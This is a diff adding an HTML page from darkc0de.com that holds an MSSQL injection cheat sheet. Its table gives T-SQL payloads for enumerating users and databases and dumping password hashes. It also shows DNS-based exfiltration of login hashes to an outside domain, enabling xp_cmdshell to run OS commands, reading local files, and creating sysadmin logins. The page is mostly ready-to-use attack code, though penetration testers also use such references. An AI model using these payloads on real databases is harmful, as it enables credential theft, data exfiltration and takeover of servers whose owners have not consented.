@@ -1,0 +1,118 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<style type="text/css">
+/* <![CDATA[ */
+
+table, td
+{
+    border-color: #353637;
+    border-style: solid;
+}
+
+table
+{
+    border-width: 0 0 2px 2px;
+    border-spacing: 0;
+    border-collapse: collapse;
+}
+
+td
+{
+    margin: 0;
+    padding: 10px;
+    border-width: 2px 2px 0 0;
+}
+
+/* ]]> */
+</style>
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+	<head>
+	<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+	
+	<title>darkc0de.com [ MSSQL Injection Cheat Sheet ]</title>
+	<link rel="stylesheet" type="text/css" href="/style.css" />
+	
+	</head>
+
+	<body>
+		<div id="outer">
+			<div id="inner">
+			
+				 <div id="close"><a href="/index.shtml" title="close and return to menu">X</a></div>
+				 <div id="top"><a href="#top" title="back to top">^</a></div> 
+			
+				 <!--greyed out links-->
+				<div class="bgtext">dark  c0de</div>
+				 <div id="text1">scanners</div>
+				 <div id="text2">encryption</div>
+				 <div id="text3">miscellaneous</div>
+				 <div id="text4">bruteforce</div>
+				 <div id="text5">irc-bots</div>
+				 <div id="text6">others</div>
+				<div id="text7">development</div>
+				 <div id="text8">py&raquo;exploits</div>	
+				 <div id="text10">[s3rvices]</div>
+				 <div id="text11">Welcome:</div>
+				 <div id="text13">Affiliates</div>
+				 <div id="text14">[sn1ppets]</div>
+				 <div id="text16">Viewed:</div>
+				 <!--greyed out links end-->
+			
+				 <div id="urltext"><a href="/index.shtml" class="navigurl" title="click to return to the index page">/home &raquo; </a>MSSQL Injection Cheat Sheet</div>
+				 	  
+					  <div id="content">
+					  	   <a name="top"></a> 
+
+					  	   <div class="titleblock">Welcome,&nbsp;212.235.66.182</div>
+
+    						   Send all updates to <a href="mailto:d3hydr8[at]gmail[dot]com">[ d3hydr8[at]gmail[dot]com ]</a> or use the form below. 
+						   <div class="titleblock">Last Modified: Tuesday, 22-Sep-2009 10:11:18 EDT</div>
+								<br>
+								<center><form action="/cgi-bin/getinput.py" method='post'>
+									<b>Submit:&nbsp;&nbsp;</b>
+    									<textarea maxlength="30" onkeyup="return ismaxlength(this)" style="background-color:#B0C4DE" name = "message" rows = 1 cols = 40>Enter an update with full details.</textarea><br>
+    									<input type="image" border="0" name="submit" value="send" src="/images/submit.jpg"></form></center><br>
+						   			
+									<ul><li><a href="/database/oracle-cs.shtml">Oracle</a></li>
+									<li><a href="/database/mssql-cs.shtml">MSSQL</a></li>
+									<li><a href="/database/mysql-cs.shtml">MySQL</a></li>
+									<li><a href="/database/postgres-cs.shtml">PostgreSQL</a></li>
+									<li><a href="/database/ingres-cs.shtml">Ingres</a></li>
+									<li><a href="/database/db2-cs.shtml">DB2</a></li>
+									<li><a href="/database/msaccess-cs.shtml">MS Access</a></li></ul>
+									<br><br><center>
+									<table width="519">
+									<tbody><tr><td>Version<br></td><td>SELECT @@version</td></tr><tr><td>Comments&nbsp;</td><td>SELECT 1 -- comment<br>SELECT /*comment*/1</td></tr><tr><td>Current User <br></td><td>SELECT user_name(); <br>SELECT system_user; <br>SELECT user; <br>SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID</td></tr><tr><td>List Users</td><td>SELECT name FROM master..syslogins <br></td></tr><tr><td>List Password Hashes<br></td><td>SELECT name, password FROM master..sysxlogins -- priv, mssql 2000;<br>SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins -- priv, mssql 2000.&nbsp; Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.<br>SELECT name, password_hash FROM master.sys.sql_logins -- priv, mssql 2005;<br>SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins -- priv, mssql 2005    </td></tr><tr><td>List Privileges</td><td>Impossible?<br></td></tr><tr><td>List DBA Accounts</td><td>TODO<br>SELECT is_srvrolemember('sysadmin'); -- is your account a sysadmin?&nbsp; returns 1 for true, 0 for false, NULL for invalid role.&nbsp; Also try 'bulkadmin', 'systemadmin' and other values from the <a href="http://msdn.microsoft.com/en-us/library/ms176015.aspx">documentation<br></a> SELECT is_srvrolemember('sysadmin', 'sa'); -- is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.<br></td></tr><tr><td>Current Database&nbsp;  </td><td>SELECT DB_NAME()&nbsp;</td></tr><tr><td>List Databases </td><td>SELECT name FROM master..sysdatabases; <br>SELECT DB_NAME(N); -- for N = 0, 1, 2, ... <br></td></tr><tr><td>List Columns <br></td><td>SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable'); -- for the current DB only<br>SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; -- list colum names and types for master..sometable<br></td></tr><tr><td>List Tables </td><td>SELECT name FROM master..sysobjects WHERE xtype = 'U'; -- use xtype = 'V' for views<br>SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';<br>SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; -- list colum names and types for master..sometable<br></td></tr><tr><td>Find Tables From Column Name </td><td>-- NB: This example works only for the current database.&nbsp; If you wan't to search another db, you need to specify the db name (e.g. replace sysobject with mydb..sysobjects).<br>SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = 'U' AND syscolumns.name LIKE '%PASSWORD%' -- this lists table, column for each column containing the word 'password' </td></tr><tr><td>Select Nth Row</td><td>SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC -- gets 9th row&nbsp;</td></tr><tr><td>Select Nth Char  <br></td><td>SELECT substring('abcd', 3, 1) -- returns c<br></td></tr><tr><td>Bitwise AND&nbsp; <br></td><td>SELECT 6 &amp; 2 -- returns 2<br>SELECT 6 &amp; 1 -- returns 0 <br></td></tr><tr><td><p>ASCII Value -&gt; Char</p></td><td>SELECT char(0x41) -- returns A<br></td></tr><tr><td>Char -&gt; ASCII Value</td><td>SELECT ascii('A') - returns 65<br></td></tr><tr><td>Casting</td><td>SELECT CAST('1' as int);<br>SELECT CAST(1 as char) <br></td></tr><tr><td>String Concatenation</td><td>SELECT 'A' + 'B' - returns AB<br></td></tr><tr><td><p>If Statement</p></td><td><p><span>IF (1=1) SELECT 1 ELSE SELECT 2 -- returns 1</span> </p></td></tr><tr><td>Case Statement</td><td>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END -- returns 1 </td></tr><tr><td>Avoiding Quotes <br></td><td>SELECT char(65)+char(66) -- returns AB<br></td></tr><tr><td>Time Delay&nbsp; <br></td><td>&nbsp;WAITFOR DELAY '0:0:5' -- pause for 5 seconds </td></tr><tr><td>Make DNS Requests</td><td><p>   declare @host varchar(800); select @host = name FROM master..syslogins; exec('master..xp_getfiledetails ''\\' + @host + '\c$\boot.ini'''); -- nonpriv, works on 2000  </p> <p>   declare @host varchar(800); select @host = name + '-' + master.sys.fn_varbintohexstr(password_hash) + '.2.pentestmonkey.net' from sys.sql_logins; exec('xp_fileexist ''\\' + @host + '\c$\boot.ini'''); -- priv, works on 2005<br> </p><p>-- NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host.&nbsp; Messy but necessary. <br>-- Also check out theDNS tunnel feature of <a href="http://sqlninja.sourceforge.net/sqlninja-howto.html">sqlninja</a> </p></td></tr><tr><td>Command Execution</td><td><p>EXEC xp_cmdshell 'net user'; -- priv</p><p>On MSSQL 2005 you may need to reactivate xp_cmdshell first as it's disabled by default:<br>EXEC sp_configure 'show advanced options', 1; -- priv<br>RECONFIGURE; -- priv<br>EXEC sp_configure 'xp_cmdshell', 1; -- priv<br>RECONFIGURE; -- priv </p></td></tr><tr><td>Local File Access<br></td><td>CREATE TABLE mydata (line varchar(8000));<br>BULK INSERT mydata FROM 'c:\boot.ini';<br>DROP TABLE mydata;<br></td></tr><tr><td>Hostname, IP Address</td><td>SELECT HOST_NAME() <br></td></tr><tr><td>Create Users</td><td>EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms173768.aspx">sp_addlogin</a>  'user', 'pass'; -- priv<br></td></tr><tr><td>Drop Users</td><td>EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms189767.aspx">sp_droplogin</a>  'user'; -- priv<br></td></tr><tr><td>Make User DBA</td><td>EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms186320.aspx">master.dbo.sp_addsrvrolemember</a>  'user', 'sysadmin; -- priv<br></td></tr><tr><td>&nbsp;Location of DB files<br></td><td>TODO<br></td></tr></tbody></table>
+									<br>
+									<br>
+									
+<br><br>
+<a href="http://www.darkc0de.com/store/advertise.html"><font color="white"><b>Advertise Here</b></a></font><br>
+<script language="javascript">
+	zoneIdentifier="3F8D8B7CF6A06513";
+	var varCheckURL = (("https:" == document.location.protocol) ? "https://" : "http://");
+	document.write(unescape("%3Cscript src='" + varCheckURL + "adcode.adengage.com/bootstrap/ae.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<br><br>
+
+									<b><font size="2" face="courier">This site is maintained by d3hydr8[at]gmail[dot]com
+									<br>darkc0de.com &trade; &copy; 2006-Now</font></b>
+									<br>
+									<br>
+									</center>
+									<br>
+									
+						  
+						   		</ol>
+								
+						   <div class="titleblock">EOF</div>
+					 
+					 </div>
+			
+			</div>
+		</div>
+		
+	</body>
+
+</html>
